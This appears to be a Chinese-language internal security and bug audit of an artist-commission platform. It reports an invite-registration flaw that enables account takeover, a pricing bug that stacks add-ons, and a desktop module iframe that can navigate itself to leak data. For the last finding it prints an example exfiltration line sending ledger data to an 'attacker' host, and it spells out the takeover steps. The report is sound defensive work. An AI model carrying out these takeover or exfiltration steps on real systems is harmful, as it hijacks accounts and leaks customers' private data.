### P0-1　邀请注册「空壳覆盖」可被任意持码者接管他人画师账号
- **端**：server｜**复杂度**：中｜**核实**：✅成立（机制逐行确认；攻击原语已被现有测试 `server/tests/invite.test.ts` TC-INV-07b 正面坐实）
- **人话**：小明用邀请码注册了小店、扫码绑定 TOTP 前关了页面。小红只要知道小明的 QQ 号，拿**任意一张**没用过的邀请码再提交一次注册，就能把该账号改名换主页、**服务端把全新 TOTP 密钥直接返回给小红**，小红自己手机绑完这号就是她的了——小明的订单/账本/作品全量易主，且此后用该 QQ 注册永远提示「已被注册」。
- **根因**：注册对 `qqNumber` 只查重、**不校验「你是这个 QQ 的主人」**；把「未绑 TOTP 且未删未封」的账号判为可就地覆盖的空壳；confirm 阶段只按 QQ 查、不校验是否本次邀请人。
- **位置**：`server/src/features/invite/invite.service.ts:292-295`（空壳判定）、`:316-319`（就地 UPDATE 保留 id）、`:333-334`（换新密钥）、`:352-353`（把新密钥 otpauthUri 返回调用者）、`:377-408`（confirm 只按 QQ 查→签发会话）；公开端点 `invite.routes.ts:48-68`（无需登录，仅 IP 限流 10 次/5 分钟）
- **修复方向**（推荐 1+2 组合）：①【根本】注册时对已存在 QQ 要求归属凭据（验证码 / 管理员预登记 QQ→邀请码绑定比对）；②【最小改动】空壳判定加「该号从未绑定过 TOTP（`totp_secret IS NULL`）」，挡住 resetTotp 路径；③【纵深】confirm 复核该 QQ 注册时记录的邀请码与会话一致、未被并发确认。
- **验收**：补用例——「攻击者持他人 QQ + 新邀请码 register 不得改写既有账号 / 不得返回可用密钥」；已有 TC-INV-07b 语义应从「同一人重试」收紧。

### P0-2　手动录单：手输「最终价格」后自定义增项被重复叠加，落库金额 ≠ 画师确认金额
- **端**：web × server（口径分歧）｜**复杂度**：中（前后端联调）｜**核实**：✅成立（主代理亲读提交序列确认；**原报告 web 侧行号已漂移，真实提交序列在 `:357-404`**）
- **人话**：画师手动录单，选画风尺寸算出 ¥100，加一个 ¥50 自定义增项（总价行显示 ¥150），再把「最终价格」手输成 ¥200。提交后落库变 **¥250**——画师确认的是 ¥200，实际收 ¥250，客户 `/track` 看到的应收也是 ¥250。同屏还并存 ¥150（总价行）、¥200（提交按钮）两个数。
- **根因**：提交序列是「createManualOrder（后端按计算价入账）→ `updatePrice(手输价)` 绝对赋值 → 逐条 `addExtraItem(自定义增项)`」；而 `addExtraItem` 走的 `adjustFinalPrice` 是**加减法**（有意为之，保护手动改价不被覆盖），于是增项被加在了手输价之上。
- **位置**：`web/src/components/artist/order/ManualOrderRight.vue:357`（创建）、`:374-389`（updatePrice 手输价，注释「修复 005 事故」）、`:391-404`（addExtraItem 增项补写）；`server/src/features/order/order-pricing.ts:193-206`（`adjustFinalPrice` 加减法 `newFinal = currentFinal + deltaCents`）
- **修复方向**（推荐 1）：①调整前端提交顺序——**先写完全部自定义增项，最后再 `updatePrice(手输价)`**，让手输价成为最终覆盖值；②或确立「手输价即含增项总价」语义，改价时跳过增项累加；③【必须同时修】统一展示口径（见 WEB-01）；④【加固】后端 `addExtraItem` 检测「刚被 updateFinalPrice 绝对赋值过」则拒绝继续加减。
- **验收**：`选尺寸(¥100)→加自定义增项¥50→手输最终价200→提交`，断言 `GET /api/artist/orders/:id` 的 `final_price_cents === 20000`（当前为 25000）。

### P0-3　桌面端模块沙箱帧可自我导航（location.href），突破「本地模式零网络」外带账本数据
- **端**：desktop｜**复杂度**：中｜**核实**：✅成立（CSP 无导航指令 + sandbox 仅 allow-scripts + ledger 下发敏感数据，三者逐行确认；两任务包互证）
- **人话**：画师装的第三方模块，可以在自己的小 iframe 里执行 `location.href = 'https://attacker/?d=' + 本地账本数据` 跳出沙箱，把**客户名、金额、截稿日**带出本机——即使模块声明「不联网」、即使处于本地模式。
- **根因**：帧级 CSP（`default-src 'none'; connect-src 'none'`）只管子资源、**不管辖帧自身重新导航**（CSP3 `navigate-to` Chromium 从未实现）；HTML `sandbox="allow-scripts"` 只禁导航祖先/顶层、**允许导航自己**；而 ledger 视图对声明了 `views:["ledger"]` 的模块无条件下发敏感字段。
- **位置**：`desktop/src/modules/frame.ts:8-11`（MODULE_CSP 无导航指令）、`:66-80`（buildModuleHtml/buildFrameSrc，data: URL opaque origin）；`desktop/src/components/home/ModuleFrame.vue:212,215`（`v-if="phase!=='grey'"` + `sandbox="allow-scripts"`）、`:118-124`（viewSources 下发 ledger）；`desktop/src/modules/viewData.ts:34-44`（ledger 下发 `client_name/title/price/deadline/status`）
- **危害边界（核验修正，勿夸大）**：数据外泄成立且**不受保险丝限制**（导航瞬间完成）；但远端页面不会长期占据窗口（未 ready 5s 置灰 / 心跳失联 15s 置灰后销毁 iframe，容器高仅 150/220px）；导航后是 opaque origin 无 `__TAURI_INTERNALS__`，**不能升级为 bridge 命令调用**。
- **修复方向**（推荐 1+2）：①【根本】禁止第三方模块获取 ledger 视图，或把 `views:["ledger"]` 限定为第一方/签名模块（`modules.rs` 加来源/签名校验）；②【工程可行】Tauri 侧监听模块帧 `framenavigated`，白名单仅允许 `data:`/`about:blank`，其余阻止；③【产品】`ModulesTool.vue` 标注的「网络：不联网」若构成安全承诺，当前实现不成立——要么实现要么改文案。
- **验收**：建测试模块（`views:["ledger"]`、`network.scope:"none"`）执行 `getData('ledger', d => location.href='https://127.0.0.1:8443/log?d='+...)`，本地监听端口**不应**收到带 client_name/price 的请求（需 WebView2 真机验证）。
